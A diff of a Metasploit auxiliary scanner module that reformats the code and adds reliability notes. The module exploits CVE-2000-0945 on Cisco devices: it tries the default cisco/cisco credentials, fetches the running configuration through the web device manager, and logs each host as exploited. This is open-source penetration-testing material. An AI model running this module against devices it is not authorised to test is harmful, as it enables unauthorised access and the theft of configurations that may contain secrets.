@@ -3,8 +3,6 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-
 class MetasploitModule < Msf::Auxiliary
 
   # Exploit mixins should be called first
@@ -16,35 +14,43 @@ class MetasploitModule < Msf::Auxiliary
   # Scanner mixin should be near last
   include Msf::Auxiliary::Scanner
 
-  def initialize(info={})
-    super(update_info(info,
-      'Name'           => 'Cisco Device HTTP Device Manager Access',
-      'Description'    => %q{
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Cisco Device HTTP Device Manager Access',
+        'Description' => %q{
           This module gathers data from a Cisco device (router or switch) with the device manager
-        web interface exposed. The HttpUsername and HttpPassword options can be used to specify
-        authentication.
-      },
-      'Author'		=> [ 'hdm' ],
-      'License'		=> MSF_LICENSE,
-      'References'	=>
-        [
+          web interface exposed. The HttpUsername and HttpPassword options can be used to specify
+          authentication.
+        },
+        'Author'	=> [ 'hdm' ],
+        'License'	=> MSF_LICENSE,
+        'References' => [
           [ 'BID', '1846'],
           [ 'CVE', '2000-0945'],
           [ 'OSVDB', '444'],
         ],
-      'DisclosureDate' => '2000-10-26'))
+        'DisclosureDate' => '2000-10-26',
+        'Notes' => {
+          'Reliability' => UNKNOWN_RELIABILITY,
+          'Stability' => UNKNOWN_STABILITY,
+          'SideEffects' => UNKNOWN_SIDE_EFFECTS
+        }
+      )
+    )
     register_options(
       [
         OptString.new('HttpUsername', [true, 'The HTTP username to specify for basic authentication', 'cisco']),
         OptString.new('HttpPassword', [true, 'The HTTP password to specify for basic authentication', 'cisco'])
-      ])
+      ]
+    )
   end
 
   def run_host(ip)
-
     res = send_request_cgi({
-      'uri'  		=>  "/exec/show/version/CR",
-      'method'   	=> 'GET'
+      'uri' => "/exec/show/version/CR",
+      'method' => 'GET'
     }, 20)
 
     if res and res.code == 401
@@ -68,10 +74,10 @@ class MetasploitModule < Msf::Auxiliary
           {
             :host	=> rhost,
             :port	=> rport,
-            :proto  => 'tcp',
+            :proto => 'tcp',
             :name	=> self.name,
             :info	=> "Module #{self.fullname} successfully accessed http://#{rhost}:#{rport}/exec/show/version/CR",
-            :refs   => self.references,
+            :refs => self.references,
             :exploited_at => Time.now.utc
           }
         )
@@ -79,8 +85,8 @@ class MetasploitModule < Msf::Auxiliary
       end
 
       res = send_request_cgi({
-        'uri'  		=>  "/exec/show/config/CR",
-        'method'   	=> 'GET'
+        'uri' => "/exec/show/config/CR",
+        'method' => 'GET'
       }, 20)
 
       if res and res.body and res.body =~ /<FORM METHOD([^\>]+)\>(.*)/mi
@@ -92,6 +98,5 @@ class MetasploitModule < Msf::Auxiliary
       end
 
     end
-
   end
 end
